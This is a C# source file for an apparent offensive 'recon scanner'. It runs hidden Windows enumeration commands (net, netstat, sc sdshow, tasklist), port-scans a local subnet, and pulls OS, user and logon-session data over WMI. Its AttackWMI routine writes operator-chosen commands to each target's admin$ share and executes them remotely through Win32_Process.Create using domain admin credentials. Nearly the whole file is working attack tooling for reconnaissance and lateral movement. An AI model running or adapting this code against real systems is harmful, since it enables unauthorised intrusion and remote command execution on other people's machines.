﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Security;
using System.Diagnostics;
using System.Net.Sockets;
using System.IO;
using System.Threading;
using System.Net;
using System.Management;
using System.Text.RegularExpressions;
using System.Net.NetworkInformation;

namespace Recon
{
    class Program
    {
        static void Main(string[] args)
        {


            Console.WriteLine("Welcome to the recon scanner." + "\r\n");


            //Create document for scan results
            string docPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            Console.WriteLine("Conduct local system recon? Enter 'y' or 'n' or 'exit':");
            string machineInfo = Console.ReadLine();

            //Determine if user wants to do a local recon scan
            while (machineInfo != "y" && machineInfo != "n")
            {
                Console.WriteLine("Invalid selection. Would you like to conduct local system recon? Enter 'y' or 'n' or 'exit': ");
                machineInfo = Console.ReadLine();
            }

            //Run local recon if user selects yes
            if (machineInfo == "y")
            {
                LocalMachine();
            }
            else if (machineInfo == "exit")
            {
                Environment.Exit(0);
            }

            //See if user wants to do a network scan
            var networkScan = NetworkChoice();
            //If they select yes, get type
            if (networkScan == "n")
            {
                Environment.Exit(0);
            }

            //Continue with scan if not exited
            //Get type of scan
            var scanType = UserSelection();


            //WMI user information
            string wmiUsername = "";
            string wmiPassword = "";
            string domainURL = "";

            // Get WMI User Info
            if (scanType == "1")
            {
                Console.WriteLine("This process requires Domain Admin credentials, proceed? Enter 'y' or 'n':");
                string hasDomain = Console.ReadLine();
                while (hasDomain != "y" && hasDomain != "n")
                {
                    Console.WriteLine("Invalid selection. This process requires Domain Admin credentials, proceed? Enter 'y' or 'n':");
                    hasDomain = Console.ReadLine();
                }
                if (hasDomain == "y")
                {
                    Console.WriteLine("Enter user name:");
                    wmiUsername = Console.ReadLine();
                    //Password
                    Console.WriteLine("Enter password:");
                    wmiPassword = Console.ReadLine();
                    //Get computer domain
                    Console.WriteLine("Enter network domain:");
                    domainURL = Console.ReadLine();
                }

            }


            //Get Default gateway
            string localIp = Convert.ToString(GetDefaultGateway());

            //Get choice whether user wants to use default gateway or different subnet, then valid
            var ipChoice = UserIpChoice(localIp);

            //Get port type selection
            var portChoice = PortSelection();

            //Get stripped IP from ip Choice
            var strippedIp = StripIP(ipChoice);

            //Create text file for results
            using (StreamWriter outputFile = new StreamWriter(Path.Combine(docPath, "results.txt")))
            {
                outputFile.WriteLine("Results of Recon:" + "\r\n\r\n");
            }

            //Create string for found hosts
            //WmiTargetList wmiTest = new WmiTargetList();

            //Create list for WMI hosts
            List<string> wmiList = new List<string>();
            

            //Initiate scanning functions
            if (portChoice == "1" || portChoice == "2")
            {
                bool scanning = (MultithreadScan(strippedIp, portChoice, scanType, wmiUsername, wmiPassword, domainURL, docPath, wmiList));
                {
                    while (scanning == true)
                    {

                    }
                }
            }
            //Selected port scan
            else if (portChoice == "3")
            {
                while (SelectedPortScan(strippedIp, scanType, wmiUsername, wmiPassword, domainURL, docPath, wmiList) == true)
                {

                }
            }

            Console.WriteLine("Scanning finished");

            //See if user wants to drop payloads via WMI
            Console.WriteLine("Drop payload to found WMI targets? Enter 'y' or 'n' or 'exit':");
            string targetWmi = Console.ReadLine();

            while (targetWmi != "y" && targetWmi != "n" && targetWmi != "exit")
            {
                Console.WriteLine("Invalid command. Drop payload to found WMI targets? Enter 'y' or 'n' or 'exit':");
                targetWmi = Console.ReadLine();
            }
            if (targetWmi == "y")
            {
                // Attack targets
                foreach (string target in wmiList)
                {
                    AttackWMI(wmiUsername, wmiPassword, domainURL, target);
                }
            }

        }


        //Function for port selection
        public static string PortSelection()
        {
            //Get user selection for type of scan
            Console.WriteLine("Please enter 1 for full port scan, 2 for well-known port scan, 3 for selected port scan:");
            string portChoice = Console.ReadLine();
            while (portChoice != "1" && portChoice != "2" && portChoice != "3")
            {
                Console.WriteLine("Invalid selection. Please enter 1 for full port scan, 2 for well-known port scan, 3 for selected port scan:");
                portChoice = Console.ReadLine();
            }
            return portChoice;
        }


        //Function to check IP user wants to use
        public static string UserIpChoice(string defaultGateway)
        {
            Console.WriteLine("Your default gateway is " + defaultGateway + " Would you like to scan this subnet? Enter 'y' or 'n':");
            string whichNetwork = Console.ReadLine();
            string subnet = "";
            while (whichNetwork != "y" && whichNetwork != "n")
            {
                Console.WriteLine("Invalid choice. Your default gateway is " + defaultGateway + " Would you like to scan this subnet? Enter 'y' or 'n':");
                whichNetwork = Console.ReadLine();
            }
            if (whichNetwork == "y")
            {
                subnet = defaultGateway;
                ValidateIP(subnet);
            }
            else if (whichNetwork == "n")
            {
                Console.WriteLine("Please enter a subnet to scan. For example, '192.168.0.1':");
                subnet = Console.ReadLine();
                if (ValidateIP(subnet) == false)
                {
                    Console.WriteLine("Invalid IP. Please enter a subnet to scan. For example, '192.168.0.1':");
                }
            }
            return subnet;
        }

        //Function for checking if user wants to run network scan
        public static string NetworkChoice()
        {
            Console.WriteLine("Would you like to complete a network recon scan? Enter 'y' or 'n':");
            string networkChoice = Console.ReadLine();

            while (networkChoice != "y" && networkChoice != "n")
            {
                Console.WriteLine("Invalid selection. Would you like to complete a network recon scan? Enter 'y' or 'n': ");
                networkChoice = Console.ReadLine();
            }
            return networkChoice;

        }

        //Function for what type of scan
        public static string UserSelection()
        {
            Console.WriteLine("Please select scan type: type '1' for WMI + Network (REQUIRES Domain Admin credentials) or '2' for Network ONLY:");
            string scanType = Console.ReadLine();

            while (scanType != "1" && scanType != "2")
            {
                scanType = Console.ReadLine();
            }
            return scanType;
        }


        public static void LocalMachine()
        {
            //Net commands
            try
            {
                //New array for commands
                string[] netDomain = new string[5];
                netDomain[0] = "accounts";
                netDomain[1] = "group \"domain admins\" /domain";
                netDomain[2] = "localgroup administrators";
                netDomain[3] = "group \"domain controllers\" /domain";
                netDomain[4] = "start";


                foreach (string argument in netDomain)
                {
                    //Start new process
                    Process netProcess = new Process();
                    //Configure process
                    ProcessStartInfo netConfig = new ProcessStartInfo();
                    netConfig.WindowStyle = ProcessWindowStyle.Hidden;
                    netConfig.CreateNoWindow = true;
                    //Launch cmd
                    netConfig.FileName = "net.exe";
                    //Enable reading output
                    netConfig.RedirectStandardOutput = true;
                    netConfig.RedirectStandardError = true;
                    netConfig.UseShellExecute = false;
                    //Pass arguments
                    //netConfig.Arguments = netDomain;
                    netProcess.StartInfo = netConfig;
                    netConfig.Arguments = argument;
                    netProcess.Start();
                    string netDomainResult = netProcess.StandardOutput.ReadToEnd();
                    string netErr = netProcess.StandardError.ReadToEnd();
                    //Append local machine info to results
                    string docPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                    File.AppendAllText(docPath + "\\results.txt", netDomainResult + netErr + Environment.NewLine);
                    Console.WriteLine(netDomainResult);
                }

            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
            //CMD commands
            try
            {
                //Array for commands
                string[] cmdArgs = new string[5];
                cmdArgs[0] = "/c arp -a";
                cmdArgs[1] = "/c route print";
                cmdArgs[2] = "/c netstat -ano | find /i \"listening\"";
                cmdArgs[3] = "/c ipconfig /all";
                cmdArgs[4] = "/c tasklist";
                //cmdArgs[3] = "/c sc query";

                foreach (string argument in cmdArgs)
                {
                    //Start new process
                    Process cmdProcess = new Process();
                    //Configure process
                    ProcessStartInfo cmdConfig = new ProcessStartInfo();
                    cmdConfig.WindowStyle = ProcessWindowStyle.Hidden;
                    cmdConfig.CreateNoWindow = true;
                    //Launch cmd
                    cmdConfig.FileName = "cmd.exe";
                    //Enable reading output
                    cmdConfig.RedirectStandardOutput = true;
                    cmdConfig.RedirectStandardError = true;
                    cmdConfig.UseShellExecute = false;
                    //Pass arguments
                    //netConfig.Arguments = netDomain;
                    cmdProcess.StartInfo = cmdConfig;
                    cmdConfig.Arguments = argument;
                    cmdProcess.Start();
                    string cmdDomainResult = cmdProcess.StandardOutput.ReadToEnd();
                    string cmdErr = cmdProcess.StandardError.ReadToEnd();
                    //Append local machine info to results
                    string docPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                    File.AppendAllText(docPath + "\\results.txt", cmdDomainResult + cmdErr + Environment.NewLine);
                    Console.WriteLine(cmdDomainResult);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
            //Get service permissions
            try
            {
                //Command
                string scArg = "/c sc query";
                Process scProcess = new Process();
                //Configure process
                ProcessStartInfo scConfig = new ProcessStartInfo();
                scConfig.WindowStyle = ProcessWindowStyle.Hidden;
                scConfig.CreateNoWindow = true;
                //Launch cmd
                scConfig.FileName = "cmd.exe";
                //Enable reading output
                scConfig.RedirectStandardOutput = true;
                scConfig.RedirectStandardError = true;
                scConfig.UseShellExecute = false;
                //Pass arguments
                //netConfig.Arguments = netDomain;
                scProcess.StartInfo = scConfig;
                scConfig.Arguments = scArg;
                scProcess.Start();
                string scResult = scProcess.StandardOutput.ReadToEnd();
                string scErr = scProcess.StandardError.ReadToEnd();
                //Append local machine info to results
                string docPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                File.AppendAllText(docPath + "\\results.txt", scResult + scErr + Environment.NewLine);
                Console.WriteLine(scResult);

                //Regex matching pattern for SERVICE_NAME:
                string pattern = @"(?<=\SERVICE_NAME:\s)(\w+)";

                //Create list for matched values
                List<string> serviceList = new List<string>();

                //Match regex pattern
                MatchCollection matches = Regex.Matches(scResult, pattern);
                for (int i = 0; i < matches.Count; i++)
                {
                    //Console.WriteLine(matches[i].ToString());
                    //serviceList.Add(matches[i].ToString());
                    string services = matches[i].ToString();
                    Console.WriteLine(services);
                    File.AppendAllText(docPath + "\\results.txt", services + Environment.NewLine);
                    string scSDSHOW = "/c sc sdshow " + services;
                    Process scSdProcess = new Process();
                    //Configure process
                    ProcessStartInfo scSdConfig = new ProcessStartInfo();
                    scSdConfig.WindowStyle = ProcessWindowStyle.Hidden;
                    scSdConfig.CreateNoWindow = true;
                    //Launch cmd
                    scSdConfig.FileName = "cmd.exe";
                    //Enable reading output
                    scSdConfig.RedirectStandardOutput = true;
                    scSdConfig.RedirectStandardError = true;
                    scSdConfig.UseShellExecute = false;
                    //Pass arguments
                    //netConfig.Arguments = netDomain;
                    scSdProcess.StartInfo = scSdConfig;
                    scSdConfig.Arguments = scSDSHOW;
                    scSdProcess.Start();
                    string scSD = scSdProcess.StandardOutput.ReadToEnd();
                    string scSdErr = scSdProcess.StandardError.ReadToEnd();
                    //Append local machine info to results
                    File.AppendAllText(docPath + "\\results.txt", scSD + scSdErr + Environment.NewLine);
                    Console.WriteLine(scSD);
                }

            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }

        //Get default network gateway
        public static IPAddress GetDefaultGateway()
        {
            return NetworkInterface
                .GetAllNetworkInterfaces()
                .Where(n => n.OperationalStatus == OperationalStatus.Up)
                .Where(n => n.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                .SelectMany(n => n.GetIPProperties()?.GatewayAddresses)
                .Select(g => g?.Address)
                .Where(a => a != null)
                .FirstOrDefault();
        }

        //Validate IP
        public static string StripIP(string subnet)
        {
            //Split IP into array
            string[] splitAddress = subnet.Split('.');

            //Joins IP back together without the 4th octet
            string strippedIP = string.Join(".", splitAddress, 0, 3) + ".";
            return strippedIP;
        }


        //WMI recon function
        public static void WmiFunction(string hostname, string wmiUsername, string wmiPassword, string domainURL, string docPath)
        {
            try
            {
                Console.WriteLine("Establishing WMI..");
                ConnectionOptions options = new ConnectionOptions();
                options.Impersonation = ImpersonationLevel.Impersonate;
                options.Username = wmiUsername;
                options.Password = wmiPassword;
                options.Authority = "ntlmdomain:" + domainURL;

                ManagementScope scope = new ManagementScope("\\\\" + hostname + "\\root\\cimv2", options);
                scope.Connect();

                //Query system for Operating System information
                ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_OperatingSystem");
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);

                //OS collection
                ManagementObjectCollection queryCollection = searcher.Get();

                try
                {

                    foreach (ManagementObject m in queryCollection)
                    {

                        string wmiScanResults = "Computer Name     : " + m["csname"] + "\r\n" +
                        "Operating System  : " + m["Caption"] + "\r\n" +
                        "Version           : " + m["Version"] + "\r\n" +
                        "Windows Directory : " + m["WindowsDirectory"] + "\r\n" +
                        "Manufacturer      : " + m["Manufacturer"] + "\r\n" +
                        "OS Architecture   : " + m["OSArchitecture"] + "\r\n";
                        ;
                        File.AppendAllText(docPath + "\\results.txt", wmiScanResults + Environment.NewLine);
                        Console.WriteLine(wmiScanResults);
                    }

                }
                catch (UnauthorizedAccessException e)
                {
                    Console.WriteLine(e + "Access Denied, insufficient privileges");
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }


                //User Info
                ObjectQuery userQuery = new ObjectQuery("Select * FROM Win32_UserAccount");
                ManagementObjectSearcher userInfoSearch = new ManagementObjectSearcher(scope, userQuery);

                //User collection
                ManagementObjectCollection userCollection = userInfoSearch.Get();

                try
                {
                    foreach (ManagementObject user in userCollection)
                    {
                        string userResults = "Account Type: " + user["AccountType"] + "\r\n" +
                           "Domain: " + user["Domain"] + "\r\n" +
                           "Full Name: " + user["FullName"] + "\r\n" +
                           "SID: " + user["SID"] + "\r\n" +
                           "Password Expires: " + user["PasswordExpires"] + "\r\n" +
                           "Password Changeable: " + user["PasswordChangeable"] + "\r\n\r\n";
                        File.AppendAllText(docPath + "\\results.txt", userResults + Environment.NewLine);
                        Console.WriteLine(userResults);
                    }
                }
                catch
                {

                }


                //Logon Info
                ObjectQuery logonQuery = new ObjectQuery("Select * FROM Win32_LogonSession");
                ManagementObjectSearcher logonInfo = new ManagementObjectSearcher(scope, logonQuery);

                //User collection
                ManagementObjectCollection logonCollection = logonInfo.Get();

                try
                {
                    foreach (ManagementObject logon in logonCollection)
                    {
                        string logonResults = "Logon info: " + logon["Name"] + "\r\n" +
                            "Start: " + logon["StartTime"] + "\r\n" +
                            "Status: " + logon["Status"] + "\r\n" +
                            "Authentication: " + logon["AuthenticationPackage"] + "\r\n" +
                            "Logon ID: " + logon["LogonId"] + "\r\n" +
                            "Logon Type: " + logon["LogonType"];
                        File.AppendAllText(docPath + "\\results.txt", logonResults + Environment.NewLine);
                        Console.WriteLine(logonResults);
                    }
                }
                catch
                {

                }



            }
            catch (UnauthorizedAccessException e)
            {
                Console.WriteLine(e + "Access Denied, insufficient privileges");
            }
            catch (ManagementException)
            {

            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }

        }

        //Checks if IP address is valid
        public static bool ValidateIP(string ipString)
        {
            if (ipString.Count(c => c == '.') != 3) return false;
            IPAddress address;
            return IPAddress.TryParse(ipString, out address);
        }


        //For attacking found WMI targets later
        public static void AttackWMI(string wmiUsername, string wmiPassword, string domainURL, string hostname)
        {
            //Get commands for attack
            string commandFile = @"\\" + hostname + "\\admin$\\process.bat";


            //Delete the file if it exists already
            if (File.Exists(commandFile))
            {
                File.Delete(commandFile);
            }

            StreamWriter sw = new StreamWriter(commandFile);

            //Command
            string command = "DIR > <a>\\\\</a>" + hostname + "\\admin$\\output.txt";
            Console.WriteLine("Enter remote command, for example, Notepad.exe, Dir, Shutdown -r:");
            //Get command from user
            command = Console.ReadLine();
            if (command.Trim() == string.Empty)
            {
                Console.WriteLine("No command entered, using default command for test: " + command);
            }
            sw.WriteLine(command);
            sw.Close();

            Console.WriteLine("Attacking via WMI..");
            ConnectionOptions options = new ConnectionOptions();
            options.Impersonation = ImpersonationLevel.Impersonate;
            options.Username = wmiUsername;
            options.Password = wmiPassword;
            options.Authority = "ntlmdomain:" + domainURL;

            ManagementScope scope = new ManagementScope("\\\\" + hostname + "\\root\\cimv2", options);
            scope.Connect();

            ObjectGetOptions objectGetOptions = new ObjectGetOptions();
            //Management path
            ManagementPath managementPath = new ManagementPath("Win32_Process");
            //Class
            ManagementClass processClass = new ManagementClass(scope, managementPath, objectGetOptions);

            //Create method parameters
            ManagementBaseObject inParams = processClass.GetMethodParameters("Create");

            inParams["CommandLine"] = commandFile;

            ManagementBaseObject outParams = processClass.InvokeMethod("Create", inParams, null);

            Console.WriteLine("Creation of the process return: " + outParams["returnValue"]);
            Console.WriteLine("Process ID: " + outParams["processId"]);

            
        }


        //well known ports methods
        public static bool MultithreadScan(string strippedIP, string portChoice, string type, string wmiUsername, string wmiPassword, string domainURL, string docPath, List<string> wmiList)
        {


            if (portChoice == "1")
            {
                Console.WriteLine("Starting full port scan, this will take a while, please wait for scan finished message...");
                try
                {
                    Thread thread = new Thread(() => Ports(strippedIP, 1, 65, 1, 65536, type, wmiUsername, wmiPassword, domainURL, docPath, wmiList));
                    thread.Start();

                    Thread thread2 = new Thread(() => Ports(strippedIP, 64, 129, 1, 65536, type, wmiUsername, wmiPassword, domainURL, docPath, wmiList));
                    thread2.Start();

                    Thread thread3 = new Thread(() => Ports(strippedIP, 128, 193, 1, 65536, type, wmiUsername, wmiPassword, domainURL, docPath, wmiList));
                    thread3.Start();

                    Thread thread4 = new Thread(() => Ports(strippedIP, 192, 256, 1, 65536, type, wmiUsername, wmiPassword, domainURL, docPath, wmiList));
                    thread4.Start();

                    while (thread4.IsAlive == true)
                    {

                    }

                }
                catch
                {

                }
            }
            else if (portChoice == "2")
            {
                Console.WriteLine("Starting well-known scan, this will take a while, please wait for scan finished message...");
                try
                {
                    Thread thread = new Thread(() => Ports(strippedIP, 1, 65, 1, 1025, type, wmiUsername, wmiPassword, domainURL, docPath, wmiList));
                    thread.Start();

                    Thread thread2 = new Thread(() => Ports(strippedIP, 64, 129, 1, 1025, type, wmiUsername, wmiPassword, domainURL, docPath, wmiList));
                    thread2.Start();

                    Thread thread3 = new Thread(() => Ports(strippedIP, 128, 193, 1, 1025, type, wmiUsername, wmiPassword, domainURL, docPath, wmiList));
                    thread3.Start();

                    Thread thread4 = new Thread(() => Ports(strippedIP, 192, 256, 1, 1025, type, wmiUsername, wmiPassword, domainURL, docPath, wmiList));
                    thread4.Start();

                    while (thread4.IsAlive == true)
                    {

                    }

                }
                catch
                {

                }
            }
            return false;
        }

        //well known ports
        public static void Ports(string strippedIP, int startIp, int stopIp, int portStart, int portStop, string type, string wmiUsername, string wmiPassword, string domainURL, string docPath, List<string> wmiList)
        {
            // WMI Scan
            if (type == "1")
            {
                for (int i = startIp; i < stopIp; i++)
                {
                    for (int j = portStart; j < portStop; j++)
                    {
                        string results = "";
                        try
                        {
                            var client = new TcpClient();
                            {
                                if (!client.ConnectAsync(strippedIP + Convert.ToString(i), +j).Wait(1000))
                                {
                                    // connection failure
                                    Console.WriteLine("Connection to " + strippedIP + Convert.ToString(i) + " on port: " + Convert.ToString(j) + " failed.");
                                }
                                else
                                {
                                    Console.WriteLine("Connection to " + strippedIP + Convert.ToString(i) + " on port: " + Convert.ToString(j) + " succeeded.");
                                    results = "Connection to " + strippedIP + Convert.ToString(i) + " on port: " + Convert.ToString(j) + " succeeded.";
                                    File.AppendAllText(docPath + "\\results.txt", results + Environment.NewLine + Environment.NewLine);
                                    if (results.Contains("succeeded") && (j) == 135)
                                    {
                                        Console.WriteLine("Port 135 confirmed");
                                        WmiFunction(strippedIP + Convert.ToString(i), wmiUsername, wmiPassword, domainURL, docPath);
                                        wmiList.Add(strippedIP + Convert.ToString(i));

                                    }
                                }
                            }
                        }
                        catch (Exception)
                        {
                            //Console.WriteLine(e);
                        }
                    }
                }
            }
            //Network only
            else if (type == "2")
            {

                for (int i = startIp; i < stopIp; i++)
                {
                    for (int j = portStart; j < portStop; j++)
                    {
                        string results = "";
                        try
                        {
                            var client = new TcpClient();
                            {
                                if (!client.ConnectAsync(strippedIP + Convert.ToString(i), +j).Wait(1000))
                                {
                                    // connection failure
                                    Console.WriteLine("Connection to " + strippedIP + Convert.ToString(i) + " on port: " + Convert.ToString(j) + " failed.");
                                }
                                else
                                {
                                    Console.WriteLine("Connection to " + strippedIP + Convert.ToString(i) + " on port: " + Convert.ToString(j) + " succeeded.");
                                    results = "Connection to " + strippedIP + Convert.ToString(i) + " on port: " + Convert.ToString(j) + " succeeded.";
                                    File.AppendAllText(docPath + "\\results.txt", results + Environment.NewLine + Environment.NewLine);
                                }
                            }
                        }
                        catch (Exception)
                        {
                            //Console.WriteLine(e);
                        }
                    }
                }
            }
        }


        //selected port scan method
        public static bool SelectedPortScan(string strippedIp, string scanType, string wmiUsername, string wmiPassword, string domainURL, string docPath, List<string> wmiList)
        {
            if (scanType == "1")
            {
                string results = "";
                //Get port number from user
                Console.WriteLine("Please enter port numbers separated by commas: ");
                string ports = Console.ReadLine();
                if (ports != "")
                {
                    if (ports.Contains(" "))
                    {
                        ports.Replace(" ", "");
                    }
                    Console.WriteLine("Starting selected scan on port(s): " + Convert.ToString(ports));
                    //Add ports to list
                    List<int> portList = new List<int>();
                    //Split out data by comma values
                    string[] fullList = ports.Split(',');
                    //Iteratively add to list
                    foreach (var portNumber in fullList)
                    {
                        portList.Add(Convert.ToInt32(portNumber));
                    }
                    //Run scan
                    foreach (var portNumber in fullList)
                    {
                        for (int i = 1; i < 256; i++)
                        {
                            try
                            {
                                var client = new TcpClient();
                                {
                                    if (!client.ConnectAsync(strippedIp + Convert.ToString(i), Convert.ToInt32(portNumber)).Wait(1000))
                                    {
                                        // connection failure
                                        Console.WriteLine("Connection to " + strippedIp + Convert.ToString(i) + " on port: " + Convert.ToInt32(portNumber) + " failed.");
                                    }
                                    else
                                    {
                                        Console.WriteLine("Connection to " + strippedIp + Convert.ToString(i) + " on port: " + Convert.ToInt32(portNumber) + " succeeded.");
                                        results = "Connection to " + strippedIp + Convert.ToString(i) + " on port: " + Convert.ToInt32(portNumber) + " succeeded.";
                                        File.AppendAllText(docPath + "\\results.txt", results + Environment.NewLine + Environment.NewLine);
                                        if (results.Contains("succeeded") && Convert.ToInt32(portNumber) == 135)
                                        {
                                            Console.WriteLine("Port 135 confirmed");
                                            WmiFunction(strippedIp + Convert.ToString(i), wmiUsername, wmiPassword, domainURL, docPath);
                                            wmiList.Add(strippedIp + Convert.ToString(i));
                                        }
                                    }
                                }
                            }
                            catch (Exception)
                            {

                            }
                        }
                    }

                }
            }
            else if (scanType == "2")
            {
                string results = "";
                //Get port number from user
                Console.WriteLine("Please enter port numbers separated by commas: ");
                string ports = Console.ReadLine();
                if (ports != "")
                {
                    if (ports.Contains(" "))
                    {
                        ports.Replace(" ", "");
                    }
                    Console.WriteLine("Starting selected scan on port(s): " + Convert.ToString(ports));
                    //Add ports to list

                    string[] fullList = ports.Split(',');

                    //Run scan
                    foreach (var portNumber in fullList)
                    {
                        for (int i = 1; i < 256; i++)
                        {
                            try
                            {
                                var client = new TcpClient();
                                {
                                    if (!client.ConnectAsync(strippedIp + Convert.ToString(i), Convert.ToInt32(portNumber)).Wait(1000))
                                    {
                                        // connection failure
                                        Console.WriteLine("Connection to " + strippedIp + Convert.ToString(i) + " on port: " + Convert.ToInt32(portNumber) + " failed.");
                                    }
                                    else
                                    {
                                        Console.WriteLine("Connection to " + strippedIp + Convert.ToString(i) + " on port: " + Convert.ToInt32(portNumber) + " succeeded.");
                                        results = "Connection to " + strippedIp + Convert.ToString(i) + " on port: " + Convert.ToInt32(portNumber) + " succeeded.";
                                        File.AppendAllText(docPath + "\\results.txt", results + Environment.NewLine + Environment.NewLine);
                                    }
                                }
                            }
                            catch (Exception)
                            {

                            }
                        }
                    }
                }
            }
            return false;
        }

    }
    //class WmiTargetList
    //{
    //    public string WmiHost { set; get; }


    //}
}
